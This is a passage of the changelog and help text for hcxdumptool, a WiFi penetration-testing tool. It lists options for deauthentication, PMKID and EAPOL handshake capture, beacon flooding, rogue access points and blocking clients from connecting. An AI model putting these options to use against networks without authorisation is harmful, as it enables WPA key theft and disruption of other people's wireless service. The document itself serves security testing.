              default: 10\n--proberesponsetx=<digit>      : transmit PROBERESPONSEs of first n entries of ESSID list\n                                 default: 10\n--essidlist=<file>             : initialize ESSID list with this ESSIDs\n--errormax=<digit>             : set maximum allowed ERRORs\n                                 default: 100 ERRORs\n--watchdog=<seconds>           : set maximum TIMOUT when no packets received\n                                 default: 600 seconds\n--attemptclientmax=<digit>     : set maximum of attempts to request an EAPOL M2\n                                 default: 10 attempts\n--attemptapmax=<digit>         : set maximum of received BEACONs to request a PMKID or to get a 4-way handshake\n                                 default: stop after 4 received BEACONs\n--tot=<digit>                  : enable timeout timer in minutes\n--onsigterm=<action>           : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                 reboot:   reboot system\n--ongpiobutton=<action>        : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--ongtot=<action>              : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--onwatchdog=<action           : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--onerror=<action>             : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--gpio_button=<digit>          : Raspberry Pi GPIO pin number of button (2...27)\n                                  push GIPO button (> 10 seconds) to terminate program\n                                  default: 0 (GPIO not in use)\n--gpio_statusled=<digit>       : Raspberry Pi GPIO number of status LED (2...27)\n                                  default: 0 (GPIO not in use)\n--nmea_dev=<NMEA device>       : open NMEA device (/dev/ttyACM0, /dev/tty/USB0, ...)\n                                  baudrate = BD9600\n--gpsd                         : use gpsd to get position\n                                  gpsd will be switched to NMEA0183 mode\n--nmea_out=<outfile>           : write GPS information to a nmea-format file named <outfile>\n                                  default outfile name: yyyyddmmhhmmss.nmea\n                                  output: NMEA 0183 standard messages:\n                                          $GPRMC: Position, velocity, time and date\n                                          $GPGGA: Position, orthometric height, fix related data, time\n                                          $GPWPL: Position and MAC AP\n                                          $GPTXT: ESSID in HEX ASCII\n                                  use gpsbabel to convert to other formats:\n                                   gpsbabel -w -t -i nmea -f in_file.nmea -o gpx -F out_file_gpx\n                                   gpsbabel -w -t -i nmea -f in_file.nmea -o kml -F out_file.kml\n                                  get more information: https://en.wikipedia.org/wiki/NMEA_0183\n--rcascan_passive              : do passive (R)adio (C)hannel (A)ssignment scan\n--help                         : show this help\n--version                      : show version\n\nLegend\nreal time display:\n R = + AP is in TX range\n P = + got PMKID\n M = + AP display:     got EAPOL M1M2M3 (AUTHORIZATION)\n M = + CLIENT display: got EAPOL M1M2 (ROGUE CHALLENGE)\n A = + AUTHENTICATION KEY MANAGEMENT PSK\nNotice:\nThis is a penetration testing tool!\nIt is made to detect vulnerabilities in your NETWORK mercilessly!\nTo store entire traffic, run <tshark -i <interface> -w allframes.pcapng> in parallel\n\n\n06.04.2023\n==========\nrelease v6.2.9\nseveral bug fixes\n\nThis is the last version:\nthat use WIRELESS EXTENSIONS\nthat use ETHTOOL to get/set virtual MAC address\nthat use old style status output\nthat use soft coded filter lists\nthat use msec timestamp\nthat use crypto stuff\nthat use server/client mode to display status\n\nNext version will go back to the roots:\nset focus on WPA PSK (WPA1, WPA2, WPA2 key version 3)\nset bandwidth to 20MHz to increase range\nset bitrate to lowest values to increase range\nuse active monitor mode\nuse NL80211 stack\nuse RTNETLINK\nband a, b, c, d, e support\nuse NMEA messages:\n $GPRMC: Position, velocity, time and date\n $GPGGA: Position, orthometric height, fix related data, time\n $GPWPL: Position and MAC AP\n $GPTXT: ESSID in HEX ASCII\nremove options that slow hcxdumptool down\n\n\n10.03.2023\n==========\nrelease v6.2.8\nmove to OpenSSL 3.0 EVP API (from now on OPenSSL >= 3.0 is mandatory)\nnew options\nseveral bug fixes\n\n\n16.01.2023\n==========\nhcxdumptool: added option to reset an USB device without unplugging it\n--reset_usb_device=<sysfs dev path>: reset USB device by BUS ID and device ID (/dev/bus/usb/bus_id/device_id\n                                     $ lsusb\n                                     Bus 005 Device 006: ID 7392:7710 Edimax Technology Co., Ltd Edimax Wi-Fi\n                                     sysfs dev path = /dev/bus/usb/005/006\n\n\n12.11.2022\n==========\nstart moving to OpenSSL 3.0 EVP API\nthis is a huge step forward an will break backward compatibility\nhttps://wiki.openssl.org/index.php/OpenSSL_3.0\n\n\n07.08.2022\n==========\nrelease v6.2.7\nseveral bug fixes\nstill using OpenSSL 1.1\n\n\n02.06.2022\n==========\nhcxdumptool: added warning if a not recommended driver has been detected\n\n\n31.05.2022\n==========\nhcxpcapngtool: added new option according to https://github.com/ZerBea/hcxdumptool/issues/220\n--passive                          : channel management is completely disabled - initial channel must be set by a third party tool\n                                     hcxdumptool is acting like a passive dumper (silent mode)\n                                     expect possible heavy packet loss\n\n\n22.04.2022\n==========\nrelease v6.2.6\nseveral bug fixes\nlicense update\nstill supporting OpenSSL 1.1\n\n\n01.12.2021\n==========\nrelease v6.2.5\nstill supporting OpenSSL 1.1\n\n\n08.11.2021\n==========\nhcxdumptool: replaced channel scan engine by frequency scan engine\nthis is high experimental\ntested devices:\nUSB:\nBus 005 Device 060: ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter\nBus 005 Device 062: ID 148f:761a Ralink Technology, Corp. MT7610U (\"Archer T2U\" 2.4G+5G WLAN Adapter\nBus 005 Device 064: ID 148f:5572 Ralink Technology, Corp. RT5572 Wireless Adapter\nBus 005 Device 065: ID 0e8d:7612 MediaTek Inc. MT7612U 802.11a/b/g/n/ac Wireless Adapter\nBus 005 Device 066: ID 0cf3:9271 Qualcomm Atheros Communications AR9271 802.11n\nBus 005 Device 068: ID 0bda:8178 Realtek Semiconductor Corp. RTL8192CU 802.11n WLAN Adapter\nBus 005 Device 071: ID 7392:7710 Edimax Technology Co., Ltd Edimax Wi-Fi\nBus 005 Device 073: ID 148f:7601 Ralink Technology, Corp. MT7601U Wireless Adapter\nBus 005 Device 075: ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter\nBus 005 Device 078: ID 0b05:17d1 ASUSTek Computer, Inc. AC51 802.11a/b/g/n/ac Wireless Adapter [Mediatek MT7610U]\nBus 005 Device 082: ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter\n\nPCI:\n04:00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8821CE 802.11ac PCIe Wireless Network Adapter\n\nThat is neccessary because, since WiFi 6, channel numbers are no longer unique:\nhttps://en.wikipedia.org/wiki/List_of_WLAN_channels\n\n\n24.10.2021\n==========\nhcxdumptool: added new option to ignore ioctl() warnings\n--force_interface                  : ignore all ioctl() warnings\n                                     do not report issues, if attacks or channel switch is not working as expected\n\n\n23.10.2021\n==========\nadded generic hcxdumptool.1 man page \n\n\n22.10.2021\n==========\nmoved install dir from usr/local/bin to /usr/bin\n\n\n14.09.2021\n==========\nrelease v6.2.4\nThis is the last version, supporting OpenSSL 1.1\nNext version 6.3.0 will need OpenSSL 3.0.0\n\n\n01.09.2021\n==========\nhcxdumptool: added new option to the next EAP request entry contained in the sequence passed to\n             --eapreq with a type matching the Desired Auth Type requested in a client's Legacy NAK response\n--eapreq_follownak                 : jump to Auth Type requested by client in Legacy Nak response, if type available in remaining request sequence\n\n\n29.08.2021\n==========\nhcxdumptool: GPIO flash intervall not longer hardcoded\n--gpio_statusled_intervall=<digit> : Raspberry Pi GPIO LED flash intervall\n                                     default = flash every 5 seconds\n\n\n15.08.2021\n==========\nhcxdumptool: allow MAC instead of filter list\n--filterlist_ap=<file or MAC>      : ACCESS POINT MAC or MAC filter list\n                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n                                     maximum entries 256\n                                     run first --do_rcascan to retrieve information about the target\n--filterlist_client=<file or MAC>  : CLIENT MAC or MAC filter list\n                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n                                     maximum entries 256\n                                     due to MAC randomization of the CLIENT, it does not always work!\n\n\n17.05.2021\n==========\nrelease v 6.1.6\nget ready for gcc 11.1.0\n\n\n18.03.2021\n==========\nhcxdumptool: added VENDOR filter\n--filterlist_ap_vendor=<file>      : ACCESS POINT MAC filter list by VENDOR\n                                     format: 112233, 11:22:33, 11-22-33 # comment\n                                     maximum entries 256\n                                     run first --do_rcascan to retrieve information about the target\n--filterlist_client_VENDOR=<file>  : CLIENT MAC filter list\n                                     format: 112233, 11:22:33, 11-22-33 # comment\n                                     maximum entries 256\n                                     due to MAC randomization of the CLIENT, it does not always work!\n\n\n09.03.2021\n==========\nrelease v 6.1.6\nget ready for OpenSSL 3.0\n\n\n05.03.2021\n==========\nhcxdumptool: removed preamble option, because it is ignored by most wlan adapters\n\n\n04.03.2021\n==========\nhcxdumptool: added new option to use short preamble\n--short_preamble                   : use short preamble\n                                     default: use long preamble\nthat may not work on older devices!\n\n\n23.02.2021\n==========\nhcxdumptool: allow output to stdout\n-o <dump file> : output file in pcapng format, filename '-' outputs to stdout\n                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n\n\n14.02.2021\n==========\nsll_pkttype = PACKET_OUTGOING is completey ingnored in promiscuous mode\nAt least I found a way to detect outgoing packets.\nLuckily IEEE80211_RADIOTAP_TX_FLAGS is set on outgoing packets. If we check this, we are able to ignore them.\nThat save us CPU time.\n\n\n13.02.2021\n==========\nhcxdumptool: added WATCHDOG - we need that to determine if USB device died\n             Raspberry Pi LED will flash twice if now packet received turing the last past 600 seconds\n             print AGE of last received packet in status\n\n\n09.02.2021\n==========\nstarted to prepare to use openssl 3.0\nMany structures have been made opaque in OpenSSL 3.0 since OpenSSL 1.0.2\nhttps://wiki.openssl.org/index.php/OpenSSL_3.0\nit is recommended to upgrade to at least to OpenSSL 1.1 \n\n\n06.02.2021\n==========\nhcxdumptool: fixed handling of BE (according to hcxpcapngtool fixes)\n\n\n18.01.2021\n==========\nhcxdumptool: added auto channel/auto band.\n             therefore default channel list and predefined channel lists changed!\n\n-c <digit>     : set channel (1,2,3, ...)\n                 default: auto channel/auto band\n                 maximum entries: 255\n                 standard 802.11 channels (depends on device, driver and world regulatory domain):\n                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n                 36, 38, 40, 44, 48, 52, 56, 60, 64\n                 100, 104, 108, 112, 116, 120, 124, 128\n                 132, 136, 140, 144, 149, 153, 157, 161, 165\n                 201, 205, 209, 213, 217, 221, 225, 229, 233\n-s <digit>     : set predefined scanlist\n                 0 = auto channel/auto band (default)\n                 1 = 1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13 (optimized 2.4GHz)\n                 2 = 1,2,3,4,5,6,7,8,9,10,11,12,13 (standard 2.4 GHz)\n                 3 = 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165 (standard 5GHz)\n                 4 = 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165 (standard 2.4GHz/5GHz)\n                 5 = 201,205,209,213,217,221,225,229,233 (standard 6GHz)\n\n\n16.01.2021\n==========\nhcxdumptool: added new option - rcascan ranking is no longer hard coded\n--rcascan_order=digit>             : rcascan sorting order:\n                                      0 = sort by HIT (PROBERESPONSE) (default)\n                                      1 = sort by COUNT (BEACON)\n                                      2 = sort by CHANNEL\n\n\n14.01.2021\n==========\nrelease v 6.1.5\n\n\n03.01.2021\n==========\nhcxdummptool: added new option to limit status of rcascan to n lines\n--rcascan_max=digit>               : show only n highest ranking lines\n                                     default: 256 lines\n\n\n21.12.2020\n==========\nremoved TP-LINK TL-WN722N v1 (ath9k driver) from list of working devices due to driver issue\nhcxdumptool: moved from select() to pselect()\n\n\n20.12.2020\n==========\nhcxdumptool: added tot (transmission timeout timer)\n             hcxdumptool will no longer freeze if driver died\n             this is a workaround on ath9k driver issue:\n             https://github.com/ZerBea/hcxdumptool/issues/80#issuecomment-748622644\n             not caused by hcxdumptool:\n             https://bugs.archlinux.org/task/68578\n\n\n19.12.2020\n==========\nhcxdumptool: added support for 6GHz channels 201,205,209,213,217,221,225,229,233 on option -c and option -s\n-s <digit>     : set predefined scanlist\n                 0 = 1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13 (default)\n                 1 = 1,2,3,4,5,6,7,8,9,10,11,12,13\n                 2 = 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n                 3 = 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n                 4 = 201,205,209,213,217,221,225,229,233\n\n\n10.12.2020\n==========\nMakefile: make use of pkg-config\n\n\n02.12.2020\n==========\nrelease v 6.1.4\n\n\n27.11.2020\n==========\nhcxdumptool: show openSSL version in status\n\n\n24.10.2020\n==========\nhcxdumptool: Default channels are not longer hard coded.\n\nNow hcxdumptool test if channel is available. That allow handling of channels\nfrom a patched driver.\n\nSome 2 GHz ath9k radios are actually tunable on 2312-2732 on 5 MHz steps\n\nCHAN2G(2407, 14)\nCHAN2G(2402, 15)\nCHAN2G(2397, 16)\nCHAN2G(2392, 17)\nCHAN2G(2387, 18)\nCHAN2G(2382, 19)\nCHAN2G(2377, 20)\nCHAN2G(2372, 21)\nCHAN2G(2367, 22)\nCHAN2G(2362, 23)\nCHAN2G(2357, 24)\nCHAN2G(2352, 25)\nCHAN2G(2347, 26)\nCHAN2G(2342, 27)\nCHAN2G(2337, 28)\nCHAN2G(2332, 29)\nCHAN2G(2327, 30)\nCHAN2G(2322, 31)\nCHAN2G(2317, 32)\nCHAN2G(2312, 33)\n\n\n09.10.2020\n==========\nrelease v 6.1.3\nfixed broken GPS handling\nadded better GPS error handling\n\n\n03.10.2020\n==========\nhcxdumptool: added new option\n--example                          : show some example command lines\n\n\n30.09.2020\n==========\nhcxdumptool: added new options\n--eapreq=<type><data>[:<term>],... : send max. 20 subsequent EAP requests after initial EAP ID request, hex string starting with EAP Type\n                                     response is terminated with:\n                                      :F = EAP Failure\n                                      :S = EAP Success\n                                      :I = EAP ERP Initiate\n                                      :F = EAP ERP Finish\n                                      :D = Deauthentication\n                                      :T = TLS shutdown\n                                      :- = no packet\n                                     default behavior is terminating all responses with a EAP Failure, after last one the client is deauthenticated\n--eaptlstun                        : activate TLS tunnel negotiation and Phase 2 EAP requests when requesting PEAP using --eapreq\n                                     requires --eap_server_cert and --eap_server_key\n--eap_server_cert=<server.pem>     : EAP TLS tunnel Server cert PEM file\n--eap_server_key=<server.key>      : EAP TLS tunnel Server private key file\n\n\n\n17.09.2020\n==========\nrelease v 6.1.2\n\n\n15.09.2020\n==========\nhcxdumptool: added new option\n--stop_client_m2_attacks=<digit>   : stop attacks against CLIENTS after 10 M2 frames received\n                                     affected: ap-less (EAPOL 2/4 - M2) attack\n                                     require hcxpcangtool --all option\n\n\n24.08.2020\n==========\nhcxdumptool: added new option\n--eapreq=<type><data>[:<term>],... : send max. 20 subsequent EAP requests after initial EAP ID request, hex string starting with EAP Type\n                                     response is terminated with :F = EAP Failure, :S = EAP Success, :I = EAP ERP Initiate, :F = EAP ERP Finish,\n                                     :D = Deauthentication, :- = no packet\n                                     default behavior is terminating all responses with a Failure packet, after last one the client is deauthenticated\n\n\n14.08.2020\n==========\nhcxdumptool: added new option --wpaent to announce WPA ENTERPRISE\n\n\n06.08.2020\n==========\nrelease v 6.1.1\nfixed handling of long opts\n\n\n30.07.2020\n==========\nhcxdumptool: added new option --ip to allow to set IP for server / client mode\n\n\n29.07.2020\n==========\nhcxdumptool: add new radiotap flag: IEEE80211_RADIOTAP_F_TX_NOSEQNO\nhttps://patchwork.kernel.org/patch/11680527/\n\n\n29.07.2020\n==========\nrelease v 6.1.0\n\n\n19.07.2020\n==========\nhcxdumptool: new option\n--beaconparams=<TLVs>  : update or add Information Elements in all transmitted beacons\n                         maximum 50 IEs as TLV hex string, tag id 0 (ESSID) will be ignored, tag id 3 (channel) overwritten\n                         multiple IEs with same tag id are added, default IE is overwritten by the first\n\n\n06.07.2020\n==========\nhcxdumptool: allow to set channel (-c) on --check_injection\n             fixed display channel if tags.channel is empty\n             added new option -s to set predefined scanlists\n-s <digit>     : set predefined scanlist\n                 0 = 1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13 (default)\n                 1 = 1,2,3,4,5,6,7,8,9,10,11,12,13\n                 2 = 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n                 3 = 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n\n\n15.06.2020\n==========\nrelease v 6.0.7\n\n\n10.06.2020\n==========\nhcxdumptool: changed behavior of --essidlist and --active_beacon\n             according to https://github.com/ZerBea/hcxdumptool/issues/115\n             --essidlist - transmit beacons from this list only\n             --active_beacon - transmit beacons from collected ESSIDs and from essidlist \n\n\n21.05.2020\n==========\nrelease v 6.0.6\n\n\n18.05.2020\n==========\nhcxdumptool: added new option --do_targetscan\n--do_targetscan=<MAC_AP>           : same as do_rcascan - hide all networks, except target\n\n\n17.05.2020\n==========\nhcxdumptool: fixed issue that caused hcxdumptool to respond on probereuest even if --silent is selcted\n             allow MAC format 11:22:33:44:55:66 and 11-22-33-44-55-66 in filterlists\n\n\n01.05.2020\n==========\nhcxdumptool: added option mask to save vendor defined action frames\n-f <frames>    : frames to save\n                 bitmask:\n                  0: clear default values\n                  1: MANAGEMENT frames (default)\n                  2: EAP and EAPOL frames (default)\n                  4: IPV4 frames\n                  8: IPV6 frames\n                 16: WEP encrypted frames\n                 32: WPA encrypted frames\n                 64: vendor defined frames (AWDL)\n\n\n05.04.2020\n==========\nrelease v 6.0.5\nSecurity fix: We do not want to disturb uninvolved users!\nIncrease error count and terminate hcxdumptool if channel was changed by a third party tool.\nAfter transmitting a request, hcxdumptool expect an answer on the same channel.\nIf the channel was changed by a third party tool, hcxdumptool will never get this answer and transmit again, again and again. This will jam all channels, set by the third party tool.\nhttps://forum.hashkiller.io/index.php?threads/ap-less-attack-with-hcxtools.21036/page-4#post-237403\n04.04.2020\n==========\nrelease v 6.0.4\n\n\n27.03.2020\n==========\nhcxdumptool: ERROR_MAX not longer hard coded\n--error_max=<digit>                : terminate hcxdumptool if error maximum reached\n                                     default: 100 errors\n\n\n26.03.2020\n==========\nSome drivers / firmwares provide only limited monitor functions instead of full packet injection capabilities.\nhcxdumptool: added packet injection test\n--check_injection                  : run packet injection test to determine that driver support full packet injection\\n\"\n\n\n18.03.2020\n==========\nrelease v 6.0.3\nremoved debug message \"OS not supported\" from Makefile\n\n\n14.03.2020\n==========\nrelease v 6.0.2\ncomplete rewrite from scratch\nthe Raspberry Pi is a little bit too slow, so we have to reduce status output. Most CLIENTs running randomized MACs. They are no longer displayed.\nimproved IE tag walk similar to hcxpcapngtool\nimproved attack vector\nadded new options to improve attack vector against hardened targets\nadded more information to help menu\nadded option to import Berkeley packet Filter code fom tcpdump as alternative to apfilterlist and clientfilterlist\nmake less noise on the the channel (receive more, transmit less)\nWLAN REASON CODE (deauthentication) no longer hardcoded\nmoved to git versioning on non releases\n\n$ hcxdumptool -h\nhcxdumptool 6.0.2  (C) 2020 ZeroBeat\nusage  : hcxdumptool <options>\n         press the switch to terminate hcxdumptool\n         hardware modification is necessary, read more:\n         https://github.com/ZerBea/hcxdumptool/tree/master/docs\nexample: hcxdumptool -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status=3\n         do not run hcxdumptool on logical (NETLINK) interfaces (monx, wlanxmon)\n         do not use hcxdumptool in combination with other 3rd party tools, which take access to the interface\n\nshort options:\n-i <interface> : interface (monitor mode will be enabled by hcxdumptool)\n                 can also be done manually:\n                 ip link set <interface> down\n                 iw dev <interface> set type monitor\n                 ip link set <interface> up\n                 WARNING: iw use NETLINK (libnl) and hcxdumptool will not work on pure NETLINK interfaces\n-o <dump file> : output file in pcapng format\n                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-f <frames>    : frames to save\n                 bitmask:\n                  0: clear default values\n                  1: MANAGEMENT frames (default)\n                  2: EAP and EAPOL frames (default)\n                  4: IPV4 frames\n                  8: IPV6 frames\n                 16: WEP encrypted frames\n                 32: WPA encrypted frames\n                 to clear default values use -f 0 first, followed by desired frame type (e.g. -f 0 -f 4)\n-c <digit>     : set scan list (1,2,3, ...)\n                 default scan list: 1...13\n                 maximum entries: 127\n                 allowed channels (depends on the device):\n                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n                 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68, 96\n                 100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128\n                 132, 134, 136, 138, 140, 142, 144, 149, 151, 153, 155, 157, 159\n                 161, 165, 169, 173\n-t <seconds>   : stay time on channel before hopping to the next channel\n                 default 4 seconds\n-m <interface> : set monitor mode by ioctl() system call and quit\n-I             : show WLAN interfaces and quit\n-C             : show available channels and quit\n                 if no channels are available, interface is probably in use or doesn't support monitor mode\n\nlong options:\n--do_rcascan                       : show radio channel assignment (scan for target access points)\n                                     this can be used to test that ioctl() calls and packet injection is working\n                                     if you got no HIT, packet injection is possible not working\n                                     also it can be used to get information about the target\n                                     and to determine that the target is in range\n                                     use this mode to collect data for the filter list\n                                     run this mode at least for 2 minutes\n                                     to save all received raw packets use option -o\n--reason_code=<digit>              : deauthentication reason code\n                                      recommended codes:\n                                      1 WLAN_REASON_UNSPECIFIED\n                                      2 WLAN_REASON_PREV_AUTH_NOT_VALID\n                                      4 WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY\n                                      5 WLAN_REASON_DISASSOC_AP_BUSY\n                                      6 WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA\n                                      7 WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA (default)\n                                      9 WLAN_REASON_STA_REQ_ASSOC_WITHOUT_AUTH\n--disable_client_attacks           : do not attack clients\n                                     affected: ap-less (EAPOL 2/4 - M2) attack\n--disable_ap_attacks               : do not attack access points\n                                     affected: connected clients and client-less (PMKID) attack\n--stop_ap_attacks=<digit>          : stop attacks against ACCESS POINTs if <n> BEACONs received\n                                     default: stop after 600 BEACONs\n--resume_ap_attacks=<digit>        : resume attacks against ACCESS POINTs after <n> BEACONs received\n                                     default: 864000 BEACONs\n--disable_deauthentication         : do not send deauthentication or disassociation frames\n                                     affected: conntected clients\n--silent                           : do not transmit!\n                                     hcxdumptool is acting like a passive dumper\n                                     expect possible packet loss\n--eapoltimeout=<digit>             : set EAPOL TIMEOUT (microseconds)\n                                     default: 20000 usec\n--bpfc=<file>                      : input Berkeley Packet Filter (BPF) code\n                                     steps to create a BPF (it only has to be done once):\n                                      set hcxdumptool monitormode\n                                       $ hcxumptool -m <interface>\n                                      create BPF to protect a MAC\n                                       $ tcpdump -i <interface> not wlan addr1 11:22:33:44:55:66 and not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n                                       recommended to protect own devices\n                                      or create BPF to attack a MAC\n                                       $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 -ddd > attack.bpf\n                                       not recommended, because important pre-authentication frames will be lost due to MAC randomization of the CLIENTs\n                                      use the BPF code\n                                       $ hcxumptool -i <interface> --bpfc=attack.bpf ...\n                                     see man pcap-filter for a list of all filter options\n--filterlist_ap=<file>             : ACCESS POINT MAC filter list\n                                     format: 112233445566 + comment\n                                     maximum entries 256\n                                     run first --do_rcascan to retrieve information about the target\n--filterlist_client=<file>         : CLIENT MAC filter list\n                                     format: 112233445566 # comment\n                                     maximum entries 256\n                                     due to MAC randomization of the CLIENT, it does not always work!\n--filtermode=<digit>               : mode for filter list\n                                     mandatory in combination with --filterlist_ap and/or --filterlist_client\n                                     0: ignore filter list (default)\n                                     1: use filter list as protection list\n                                        do not interact with ACCESS POINTs and CLIENTs from this list\n                                     2: use filter list as target list\n                                        only interact with ACCESS POINTs and CLIENTs from this list\n                                        not recommended, because important pre-authentication frames will be lost due to MAC randomization of the CLIENTs\n--weakcandidate=<password>         : use this pre shared key (8...63 characters) for weak candidate alert\n                                     will be saved to pcapng to inform hcxpcaptool\n                                     default: \n--mac_ap                           : use this MAC as ACCESS POINT MAC instead of a randomized one\n                                     format: 112233445566\n--mac_client                       : use this MAC as CLIENT MAC instead of a randomized one\n                                     format: 112233445566\n--essidlist=<file>                 : transmit beacons from this ESSID list\n                                     maximum entries: 256 ESSIDs\n--active_beacon                    : transmit beacon once every 200000 usec\n                                     affected: ap-less\n--flood_beacon                     : transmit beacon on every received beacon\n                                     affected: ap-less\n--infinity                         : prevent that a CLIENT can establish a connection to an assigned ACCESS POINT\n                                     affected: ACCESS POINTs and CLIENTs\n--use_gps_device=<device>          : use GPS device\n                                     /dev/ttyACM0, /dev/ttyUSB0, ...\n                                     NMEA 0183 $GPGGA $GPGGA\n--use_gpsd                         : use GPSD device\n                                     NMEA 0183 $GPGGA, $GPRMC\n--nmea=<file>                      : save track to file\n                                     format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL\n                                     to convert it to gpx, use GPSBabel:\n                                     gpsbabel -i nmea -f hcxdumptool.nmea -o gpx -F file.gpx\n                                     to display the track, open file.gpx with viking\n--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n                                     default = GPIO not in use\n--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n                                     default = GPIO not in use\n--tot=<digit>                      : enable timeout timer in minutes (minimum = 2 minutes)\n                                   : hcxdumptool will terminate if tot reached (EXIT code = 2)\n--reboot                           : once hcxdumptool terminated, reboot system\n--poweroff                         : once hcxdumptool terminated, power off system\n--enable_status=<digit>            : enable real-time display (waterfall)\n                                     only incoming traffic\n                                     only once at the first occurrence due to MAC randomization of CLIENTs\n                                     bitmask:\n                                        0: no status (default)\n                                        1: EAP and EAPOL\n                                        2: ASSOCIATION and REASSOCIATION\n                                        4: AUTHENTICATION\n                                        8: BEACON and PROBERESPONSE\n                                       16: ROGUE AP\n                                       32: GPS (once a minute)\n                                       64: internal status (once a minute)\n                                      128: run as server\n                                      256: run as client\n                                     characters < 0x20 && > 0x7e are replaced by .\n                                     example: show everything but don't run as server or client (1+2+4+8+16 = 31)\n                                              show only EAP and EAPOL and ASSOCIATION and REASSOCIATION (1+2 = 3)\n--server_port=<digit>              : define port for server status output (1...65535)\n                                   : default IP: 224.0.0.255\n                                   : default port: 60123\n--client_port=<digit>              : define port for client status read (1...65535)\n                                   : default IP: 224.0.0.255\n                                   : default port: 60123\n--check_driver                     : run several tests to determine that driver support all(!) required ioctl() system calls\n--help                             : show this help\n--version                          : show version\n\nRun hcxdumptool -i interface --do_rcascan for at least 30 seconds, before you start an attack!\nDo not edit, merge or convert this pcapng files, because it will remove optional comment fields!\nIt is much better to run gzip to compress the files. Wireshark, tshark and hcxpcapngtool will understand this.\nIf hcxdumptool captured your password from WiFi traffic, you should check all your devices immediately!\nIf you use GPS, make sure GPS device is inserted and has a GPS FIX, before you start hcxdumptool!\n\n\n06.03.2020\n==========\ncomplete rewrite from scratch\nthe Raspberry Pi is a little bit too slow, so we have to reduce status output. Most CLIENTs running randomized MACs. They are no longer displayed.\nimproved IE tag walk similar to hcxpcapngtool\nimproved attack vector\nadded new options to improve attack vector against hardened targets\nadded more information to help menu\nadded option to import Berkeley packet Filter code fom tcpdump as alternative to apfilterlist and clientfilterlist\nmake less noise on the the channel (receive more, transmit less)\nWLAN REASON CODE (deauthentication) no longer hardcoded\nmoved to git versioning on non releases\n\n\n29.01.2020\n==========\nmoved to v6.0.1\nremoved options to set userdefined MAC_AP and/or MAC_CLIENT, because they make hcxdumptool's stealth capability ineffective\nimproved handling of association/reassociation frames\nimproved handling of null/powersave frames\nadded counter for PMKID/EAPOL frames\nhandle EAP request/response frames\nimproved IE tag walk similar to hcxpcapngtool\nfixed cipher suite and AKM suite handling\nhandle wrong FCS\nreduce pcapng size\nfixed internal counters\nallow mixed attack vector PSK/PSK256\nhandle PMKID in reassociationrequest\n\n\n11.12.2019\n==========\nmoved to v6.0.0\nhcxdumptool: complete rewrite from scratch\n             filterlist splitted (APs, CLIENTs), entries increased upt to 256 each list:\n             --filterlist_ap\n             --filterlist_client\n             improved real time display:\n              driver information and firmware information (if available)\n              detailed information about PMKID and MESSAGE PAIR)\n              allow more than one option (--enable_status)\n                 0: no status (default)\n                 1: EAPOL\n                 2: PROBE REQUEST/PROBE RESPONSE\n                 4: AUTHENTICATON\n                 8: ASSOCIATION/REASSOCIATION\n                16: BEACON\n                32: GPS (once a minute)\n                64: internal status\n               128: send status to client\n             choose pcapng frames to save (-f) using option -o\n             improved rca_scan:\n              0: no real time display\n              1: show only access points in range (default)\n              2: show only access points not range\n              3: show all access points\n             improved GPS handling:\n              read GPS information directly from device\n              --use_gps_device=<device>\n              or us GPSD\n              --use_gpsd \n              use full standard NMEA raw sentence $GPGGA, $GPRMC, $GPGWL\n              this version need hcxpcaptool v6.0.0 to convert GPS information or gpsbabel\n              gpsbabel  -i nmea -f nmea.txt -o gpx -F test.gpx\n              then open test.gpx with viking (layer -> waypoint -> BSSID) \n             ignore M4 if SNONCE is zeroed\n             ignore PMKID if zeroed\n             improved handling of radiatapheader on ath9k_htc driver\n             new option codes:\n              ENTERPRISE NUMBER        0x2a, 0xce, 0x46, 0xa1\n              MAGIC NUMBER             0x2a, 0xce, 0x46, 0xa1, 0x79, 0xa0, 